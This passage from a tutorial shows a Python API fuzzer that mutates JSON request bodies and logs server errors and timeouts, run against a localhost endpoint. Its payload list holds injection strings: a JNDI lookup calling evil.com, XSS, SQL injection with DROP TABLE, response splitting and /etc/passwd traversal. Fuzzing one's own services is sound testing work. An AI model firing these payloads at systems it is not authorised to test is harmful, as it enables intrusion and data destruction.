### Step 4: Implement API Fuzzing

**Python:**
```python
import requests
import random
import string
import json


class ApiFuzzer:
    """Fuzz REST API endpoints with malformed requests."""

    MALICIOUS_STRINGS = [
        "",
        " ",
        "\x00",
        "null",
        "undefined",
        "true",
        "false",
        "-1",
        "0",
        "9999999999999999999",
        "{{template}}",
        "${jndi:ldap://evil.com/a}",
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "Robert'); DROP TABLE users;--",
        "a" * 10000,
        "\r\n\r\nHTTP/1.1 200 OK\r\n",
        "../../../etc/passwd",
    ]

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.findings = []

    def fuzz_json_body(self, endpoint: str, valid_body: dict, iterations: int = 100):
        """Fuzz a JSON API endpoint by mutating the request body."""
        for i in range(iterations):
            mutated = self._mutate_json(valid_body)
            try:
                response = requests.post(
                    f"{self.base_url}{endpoint}",
                    json=mutated,
                    timeout=5,
                )
                if response.status_code >= 500:
                    self.findings.append({
                        "type": "server_error",
                        "endpoint": endpoint,
                        "status": response.status_code,
                        "body": mutated,
                        "response": response.text[:500],
                        "iteration": i,
                    })
            except requests.Timeout:
                self.findings.append({
                    "type": "timeout",
                    "endpoint": endpoint,
                    "body": mutated,
                    "iteration": i,
                })
            except requests.ConnectionError:
                self.findings.append({
                    "type": "connection_error",
                    "endpoint": endpoint,
                    "body": mutated,
                    "iteration": i,
                })

    def _mutate_json(self, obj: dict) -> dict:
        """Apply random mutations to a JSON object."""
        mutated = json.loads(json.dumps(obj))
        mutation = random.choice([
            self._replace_value,
            self._add_extra_field,
            self._remove_field,
            self._change_type,
            self._inject_malicious,
        ])
        return mutation(mutated)

    def _replace_value(self, obj: dict) -> dict:
        if not obj:
            return obj
        key = random.choice(list(obj.keys()))
        obj[key] = random.choice([None, 0, -1, "", [], {}, True, False])
        return obj

    def _add_extra_field(self, obj: dict) -> dict:
        obj["__fuzz_" + "".join(random.choices(string.ascii_lowercase, k=5))] = (
            random.choice(self.MALICIOUS_STRINGS)
        )
        return obj

    def _remove_field(self, obj: dict) -> dict:
        if obj:
            key = random.choice(list(obj.keys()))
            del obj[key]
        return obj

    def _change_type(self, obj: dict) -> dict:
        if not obj:
            return obj
        key = random.choice(list(obj.keys()))
        original = obj[key]
        if isinstance(original, str):
            obj[key] = random.randint(-1000, 1000)
        elif isinstance(original, (int, float)):
            obj[key] = "not_a_number"
        elif isinstance(original, bool):
            obj[key] = "maybe"
        elif isinstance(original, list):
            obj[key] = "not_a_list"
        return obj

    def _inject_malicious(self, obj: dict) -> dict:
        if not obj:
            return obj
        key = random.choice(list(obj.keys()))
        obj[key] = random.choice(self.MALICIOUS_STRINGS)
        return obj


# Usage
fuzzer = ApiFuzzer("http://localhost:8000")
fuzzer.fuzz_json_body("/api/users", {
    "email": "test@example.com",
    "name": "Test User",
    "age": 25,
})
print(f"Found {len(fuzzer.findings)} issues")
for f in fuzzer.findings:
    print(f"  [{f['type']}] {f.get('status', 'N/A')}: {json.dumps(f['body'])[:100]}")
```
